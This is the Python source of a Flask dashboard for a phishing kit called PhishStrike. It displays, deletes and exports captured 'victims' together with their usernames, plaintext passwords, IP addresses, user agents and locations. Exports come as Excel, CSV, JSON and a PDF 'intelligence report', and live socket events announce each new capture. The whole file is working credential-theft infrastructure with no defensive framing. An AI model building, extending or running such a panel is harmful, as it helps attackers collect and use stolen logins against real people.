"""
PhishStrike - Dashboard Flask Application
"""

import sys
import os
import io
from datetime import datetime

from flask import Flask, render_template, jsonify, send_file, request
from flask_socketio import SocketIO

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import database
from config import Config
from lib.logger import get_logger

log = get_logger("Dashboard")

app = Flask(__name__)
app.config["SECRET_KEY"] = Config.SECRET_KEY

_cors = Config.cors_origin_list() or "*"
socketio = SocketIO(app, cors_allowed_origins=_cors, async_mode="threading")


def _emit_refresh():
    socketio.emit("new_victim", {"status": "refresh"})


@app.route("/")
def index():
    return render_template("index.html")


# ─── API Endpoints ─────────────────────────────────────────────────────────────

@app.route("/api/victims")
def get_victims():
    victims = database.get_all_victims()
    data = [
        {
            "id": v[0],
            "platform": v[1],
            "username": v[2],
            "password": v[3],
            "ip": v[4],
            "timestamp": v[5],
            "ua": v[6] if v[6] else "Unknown",
            "location": v[7] if v[7] else "Unknown",
        }
        for v in victims
    ]
    return jsonify(data)


@app.route("/api/stats")
def get_stats():
    return jsonify(database.get_stats())


@app.route("/api/delete/<int:victim_id>", methods=["POST"])
def delete_victim(victim_id):
    try:
        database.delete_victim(victim_id)
        log.info(f"Victim #{victim_id} deleted")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to delete victim #{victim_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_all", methods=["POST"])
def delete_all_victims():
    try:
        database.clear_all_victims()
        log.warning("All victims cleared")
        return jsonify({"status": "success"})
    except Exception as e:
        log.error(f"Failed to clear all victims: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export")
def export_excel():
    try:
        import pandas as pd

        victims = database.get_all_victims()
        df = pd.DataFrame(
            victims,
            columns=[
                "ID", "Platform", "Username/Email", "Password", "Source IP",
                "Captured At", "User Agent", "Location",
            ],
        )
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
        path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "auth",
            filename,
        )
        df.to_excel(path, index=False)
        log.info(f"Excel export generated: {filename}")
        return send_file(path, as_attachment=True, download_name=filename)
    except ImportError:
        return jsonify({"status": "error", "message": "pandas not installed"}), 500
    except Exception as e:
        log.error(f"Excel export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_csv")
def export_csv():
    try:
        victims = database.get_all_victims()
        lines = ["ID,Platform,Username/Email,Password,Source IP,Captured At,User Agent,Location"]
        for v in victims:
            row = [str(x).replace(",", ";") if x else "" for x in v]
            lines.append(",".join(row))
        csv_content = "\n".join(lines)
        buf = io.BytesIO(csv_content.encode("utf-8"))
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        log.info(f"CSV export generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="text/csv")
    except Exception as e:
        log.error(f"CSV export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_pdf")
def export_pdf():
    try:
        from fpdf import FPDF

        victims = database.get_all_victims()
        stats = database.get_stats()

        class PDF(FPDF):
            def header(self):
                self.set_font("Helvetica", "B", 18)
                self.set_text_color(0, 242, 255)
                self.cell(0, 12, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
                self.set_line_width(0.5)
                self.line(10, self.get_y() + 2, 200, self.get_y() + 2)
                self.ln(5)
                self.set_font("Helvetica", "I", 9)
                self.set_text_color(128, 128, 128)
                self.cell(
                    0, 8,
                    f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                    0, 1, "C",
                )
                self.ln(3)

            def footer(self):
                self.set_y(-15)
                self.set_font("Helvetica", "I", 8)
                self.set_text_color(128, 128, 128)
                self.cell(
                    0, 10,
                    f"Page {self.page_no()} | PhishStrike © 2025",
                    0, 0, "C",
                )

        pdf = PDF()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.add_page()

        pdf.set_font("Helvetica", "B", 12)
        pdf.set_text_color(0, 242, 255)
        pdf.cell(0, 8, "EXECUTIVE SUMMARY", 0, 1)
        pdf.ln(2)

        pdf.set_font("Helvetica", "", 10)
        pdf.set_text_color(0, 0, 0)
        summary_data = [
            ("Total Infiltrations", str(stats["total"])),
            ("Platforms Targeted", str(len(stats["platforms"]))),
            ("Report Generated", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
        ]
        for label, value in summary_data:
            pdf.set_font("Helvetica", "B", 9)
            pdf.cell(60, 6, f"{label}:", 0, 0)
            pdf.set_font("Helvetica", "", 9)
            pdf.cell(0, 6, value, 0, 1)
        pdf.ln(5)

        pdf.set_font("Helvetica", "B", 12)
        pdf.set_text_color(0, 242, 255)
        pdf.cell(0, 8, "PLATFORM DISTRIBUTION", 0, 1)
        pdf.ln(2)

        pdf.set_font("Helvetica", "", 9)
        pdf.set_text_color(0, 0, 0)
        for platform, count in stats["platforms"]:
            pdf.cell(80, 6, f"  {platform}", 0, 0)
            pdf.cell(0, 6, f"{count} credentials", 0, 1)
        pdf.ln(5)

        pdf.set_font("Helvetica", "B", 12)
        pdf.set_text_color(0, 242, 255)
        pdf.cell(0, 8, "COLLECTED INTELLIGENCE", 0, 1)
        pdf.ln(3)

        pdf.set_font("Helvetica", "B", 9)
        pdf.set_text_color(255, 255, 255)
        pdf.set_fill_color(30, 41, 59)

        headers = [
            ("ID", 12), ("Platform", 20), ("Username/Email", 35),
            ("Password", 35), ("Source IP", 25), ("Captured At", 28),
        ]
        for header, width in headers:
            pdf.cell(width, 8, header, 1, 0, "C", True)
        pdf.ln()

        pdf.set_font("Helvetica", "", 8)
        pdf.set_text_color(0, 0, 0)
        pdf.set_fill_color(248, 250, 252)
        fill = False

        for v in victims:
            pdf.cell(12, 7, str(v[0]), 1, 0, "C", fill)
            pdf.cell(20, 7, str(v[1])[:12], 1, 0, "L", fill)
            pdf.cell(35, 7, str(v[2])[:18], 1, 0, "L", fill)
            pdf.cell(35, 7, "*" * min(len(str(v[3])), 10), 1, 0, "L", fill)
            pdf.cell(25, 7, str(v[4]), 1, 0, "C", fill)
            pdf.cell(28, 7, str(v[5])[:15], 1, 1, "C", fill)
            fill = not fill

        buf = io.BytesIO(pdf.output())
        filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        log.info(f"PDF report generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/pdf")
    except ImportError:
        return jsonify({"status": "error", "message": "fpdf2 not installed"}), 500
    except Exception as e:
        log.error(f"PDF export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_json")
def export_json():
    try:
        import json

        victims = database.get_all_victims()
        data = [
            {
                "id": v[0],
                "platform": v[1],
                "username": v[2],
                "password": v[3],
                "source_ip": v[4],
                "captured_at": v[5],
                "user_agent": v[6] if v[6] else "Unknown",
                "location": v[7] if v[7] else "Unknown",
            }
            for v in victims
        ]
        json_content = json.dumps(data, indent=2)
        buf = io.BytesIO(json_content.encode("utf-8"))
        filename = f"phishstrike_intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        log.info(f"JSON export generated: {filename}")
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/json")
    except Exception as e:
        log.error(f"JSON export failed: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/internal/refresh", methods=["GET", "POST"])
def internal_refresh():
    """CLI capture hook."""
    _emit_refresh()
    return jsonify({"status": "ok"})


@app.route("/api/refresh")
def refresh():
    _emit_refresh()
    return jsonify({"status": "ok"})


def notify_new_victim(data):
    socketio.emit("new_victim", data)


if __name__ == "__main__":
    database.init_db()

    if not os.environ.get("SECRET_KEY"):
        log.warning(
            "SECRET_KEY not set in .env — sessions reset on each restart. "
            "Copy .env.example to .env and set SECRET_KEY."
        )

    host = Config.DASHBOARD_HOST
    port = Config.DASHBOARD_PORT
    log.info(f"PhishStrike Dashboard starting on http://{host}:{port}")

    if Config.DASHBOARD_HOST == "0.0.0.0":
        log.warning(
            "DASHBOARD_HOST=0.0.0.0 exposes the panel on your network. "
            "Use 127.0.0.1 for local-only access."
        )

    if Config.DASHBOARD_RUNTIME == "waitress":
        try:
            from waitress import serve

            log.info("Runtime: Waitress (HTTP only — UI polls every 5s)")
            serve(app, host=host, port=port, threads=8)
        except ImportError:
            log.warning("Waitress not installed — falling back to SocketIO server.")
            socketio.run(
                app, host=host, port=port,
                debug=Config.DEBUG, allow_unsafe_werkzeug=True,
            )
    else:
        log.info("Runtime: Flask-SocketIO (live WebSocket updates)")
        socketio.run(
            app, host=host, port=port,
            debug=Config.DEBUG, allow_unsafe_werkzeug=True,
        )
